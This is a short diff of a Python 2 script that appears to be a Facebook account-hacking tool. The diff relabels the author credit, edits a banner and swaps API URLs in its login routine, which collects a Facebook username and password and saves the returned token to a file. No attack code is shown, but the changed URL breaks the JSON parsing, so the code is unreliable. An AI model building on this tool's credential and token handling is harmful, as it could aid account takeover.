@@ -1,4 +1,4 @@
-#Created By DarkNoobHunter
+#Created By emad alkhashn
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -65,12 +65,12 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN emad FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('https://mbasic.facebook.com')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] There is no connection'
             keluar()
@@ -89,7 +89,7 @@ def login():
                 x.update(sig)
                 a = x.hexdigest()
                 data.update({'sig': a})
-                url = 'https://api.facebook.com/restserver.php'
+                url = 'https://mbasic.facebook.com'
                 r = requests.get(url, params=data)
                 z = json.loads(r.text)
                 zedd = open('login.txt', 'w')
